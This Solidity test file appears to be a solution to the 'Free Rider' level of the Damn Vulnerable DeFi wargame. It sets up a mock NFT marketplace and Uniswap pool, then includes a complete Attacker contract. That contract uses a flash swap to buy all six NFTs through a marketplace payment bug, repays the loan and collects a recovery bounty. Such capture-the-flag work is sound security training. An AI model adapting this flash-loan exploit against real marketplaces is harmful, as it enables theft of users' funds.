// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {FreeRiderRecovery} from "../../../src/Contracts/10.free-rider/FreeRiderRecovery.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/10.free-rider/FreeRiderNFTMarketplace.sol";
import {
    IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair
} from "../../../src/Contracts/10.free-rider/Interfaces.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";

contract FreeRider is Test {
    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;
    uint256 internal constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 0.1 ether;

    // The devs will offer 45 ETH as bounty for the recovery of the NFTs
    uint256 internal constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap v2 pool
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
    uint256 internal constant DEADLINE = 10_000_000;

    FreeRiderRecovery internal freeRiderRecovery;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableToken internal dvt;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;
    WETH9 internal weth;
    address payable internal devs;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        devs = payable(address(uint160(uint256(keccak256(abi.encodePacked("devs"))))));
        vm.label(devs, "devs");
        vm.deal(devs, BOUNTY);

        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
        vm.label(deployer, "deployer");
        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);

        // Attacker starts with little ETH balance
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy WETH contract
        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy token to be traded against WETH in Uniswap v2
        vm.startPrank(deployer);
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory =
            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // Note that the function takes care of deploying the pair automatically
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));

        assertEq(uniswapV2Pair.token0(), address(dvt));
        assertEq(uniswapV2Pair.token1(), address(weth));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);

        damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());

        for (uint8 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(damnValuableNFT.ownerOf(id), deployer);
        }

        damnValuableNFT.setApprovalForAll(address(freeRiderNFTMarketplace), true);

        uint256[] memory NFTsForSell = new uint256[](6);
        uint256[] memory NFTsPrices = new uint256[](6);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
            NFTsForSell[i] = i;
            NFTsPrices[i] = NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        freeRiderNFTMarketplace.offerMany(NFTsForSell, NFTsPrices);

        assertEq(freeRiderNFTMarketplace.offersCount(), AMOUNT_OF_NFTS);
        vm.stopPrank();

        vm.startPrank(devs);

        freeRiderRecovery = new FreeRiderRecovery{value: BOUNTY}(attacker, address(damnValuableNFT));

        vm.stopPrank();

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker, attacker);

        // Deploy the attacker contract
        Attacker attackerContract = new Attacker(
            address(uniswapV2Pair),
            address(weth),
            address(freeRiderNFTMarketplace),
            address(freeRiderRecovery),
            address(damnValuableNFT)
        );
        vm.label(address(attackerContract), "Attacker Contract");
        attackerContract.attack();

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */

        // Attacker must have earned all ETH from the payout
        assertGt(attacker.balance, BOUNTY);
        assertEq(address(freeRiderRecovery).balance, 0);

        // The devs extracts all NFTs from its associated contract
        vm.startPrank(devs);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            damnValuableNFT.transferFrom(address(freeRiderRecovery), devs, tokenId);
            assertEq(damnValuableNFT.ownerOf(tokenId), devs);
        }
        vm.stopPrank();

        // Exchange must have lost NFTs and ETH
        assertEq(freeRiderNFTMarketplace.offersCount(), 0);
        assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
    }
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

contract Attacker is IUniswapV2Callee, IERC721Receiver {
    uint256 private constant _NFT_PRICE = 15 ether;

    IUniswapV2Pair private _uniswapV2Pair;
    WETH9 private _weth;
    FreeRiderNFTMarketplace private _freeRiderNFTMarketplace;
    FreeRiderRecovery private _freeRiderRecovery;
    DamnValuableNFT private _damnValuableNFT;

    address private _owner;

    constructor(
        address uniswapV2Pair,
        address weth,
        address freeRiderNFTMarketplace,
        address freeRiderRecovery,
        address damnValuableNFT
    ) {
        _uniswapV2Pair = IUniswapV2Pair(uniswapV2Pair);
        _weth = WETH9(payable(weth));
        _freeRiderNFTMarketplace = FreeRiderNFTMarketplace(payable(freeRiderNFTMarketplace));
        _freeRiderRecovery = FreeRiderRecovery(freeRiderRecovery);
        _damnValuableNFT = DamnValuableNFT(damnValuableNFT);
        _owner = msg.sender;
    }

    function attack() external {
        address token0 = _uniswapV2Pair.token0();
        (uint256 amount0Out, uint256 amount1Out) = token0 == address(_weth) ? (_NFT_PRICE, uint256(0)) : (0, _NFT_PRICE);
        _uniswapV2Pair.swap(amount0Out, amount1Out, address(this), "attack");
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external override {
        if (msg.sender != address(_uniswapV2Pair)) {
            return;
        }

        uint256 wethAmount = amount0 > 0 ? amount0 : amount1;
        if (wethAmount < _NFT_PRICE) {
            return;
        }

        _weth.withdraw(wethAmount);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint8 i = 0; i < 6;) {
            tokenIds[i] = i;
            unchecked {
                ++i;
            }
        }

        _freeRiderNFTMarketplace.buyMany{value: wethAmount}(tokenIds);

        uint256 payback = (_NFT_PRICE * 1000 / 997) + 1;

        _weth.deposit{value: payback}();

        _weth.transfer(address(_uniswapV2Pair), payback);

        for (uint8 i = 0; i < 6;) {
            _damnValuableNFT.approve(_owner, i);

            bytes memory callData = abi.encodeWithSignature(
                "safeTransferFrom(address,address,uint256,bytes)",
                address(this),
                address(_freeRiderRecovery),
                i,
                abi.encode(address(this))
            );

            (bool success,) = address(_damnValuableNFT).call(callData);
            if (!success) {
                revert("Transfer failed");
            }

            unchecked {
                ++i;
            }
        }

        (bool success,) = _owner.call{value: address(this).balance}("");
        if (!success) {
            revert("Transfer failed");
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
    fallback() external payable {}
}
